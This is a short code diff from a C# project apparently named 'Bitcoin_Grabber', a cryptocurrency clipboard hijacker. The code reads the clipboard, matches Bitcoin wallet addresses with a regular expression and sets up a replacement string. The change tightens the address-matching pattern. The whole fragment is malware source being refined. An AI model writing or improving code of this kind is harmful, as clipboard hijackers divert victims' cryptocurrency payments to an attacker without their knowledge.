@@ -88,10 +88,10 @@ namespace Bitcoin_Grabber
                      */
 
                     string input = Clipboard.GetText();
-                    string pattern = @"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}";
+                    string pattern = @"(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}";
                     string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";
 
-                    Regex rgx = new Regex(pattern, RegexOptions.Multiline);
+                    Regex rgx = new Regex(pattern);
                     Match match = rgx.Match(input);
                     if (match.Success)
                     {
